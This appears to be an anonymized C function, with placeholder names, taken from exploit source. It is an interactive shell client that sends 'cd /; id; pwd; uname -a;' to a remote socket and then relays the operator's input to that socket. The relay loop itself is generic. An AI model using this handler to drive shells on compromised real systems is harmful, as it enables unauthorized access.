#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  fd_set ;
typedef  int /*<<< orphan*/  buf ;

/* Variables and functions */
 scalar_t__ FUNC0 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC3 (int,int) ; 
 int /*<<< orphan*/  FUNC4 (char*,int) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (int) ; 
 int /*<<< orphan*/ * FUNC7 (char*,int,int /*<<< orphan*/ ) ; 
 int FUNC8 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 
 int FUNC11 (int,char*,int) ; 
 scalar_t__ FUNC12 (scalar_t__,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  stdin ; 
 int /*<<< orphan*/  FUNC13 (char*,char*) ; 
 int FUNC14 (char*) ; 
 scalar_t__ FUNC15 (int,char*,int) ; 

void FUNC16(int sock)
{ 
  fd_set rset;  
  char bu[1024];
  
  FUNC15(sock, "cd /; id; pwd; uname -a;\n", 25);
    
  FUNC2(&rset); 
  for(;;){
    FUNC1(FUNC8(stdin), &rset);
    FUNC1(sock, &rset);
    if(FUNC12(FUNC3(sock, FUNC8(stdin))+1, &rset, NULL, NULL, NULL) < 0){
      FUNC9("select");  
      FUNC6(-1);
    }
    if(FUNC0(sock, &rset)){
      char buf[1024]; 
      int n;
  
      FUNC4(buf, sizeof(buf));
      n = FUNC11(sock, buf, sizeof(buf)-1);
      if(n == 0){
        FUNC10("EOF from server\n");
        FUNC6(0);
      }
      if(n < 0){
        FUNC9("read");
        FUNC6(-1);
      } else {
        FUNC15(1, buf, n);
      }
    }
    
    if(FUNC0(FUNC8(stdin), &rset)){
      char buf[1024];
     
      FUNC4(buf, sizeof(buf));
      if(FUNC7(buf, sizeof(buf)-4, stdin) == NULL){
        FUNC10("OK. Quitting\n");
        FUNC5(sock);
        FUNC6(0); 
      } 
      FUNC13(buf, "\n");
      if(FUNC15(sock, buf, FUNC14(buf)) < 0){
        FUNC9("write");
        FUNC6(0);
      }
    }   
  }     
}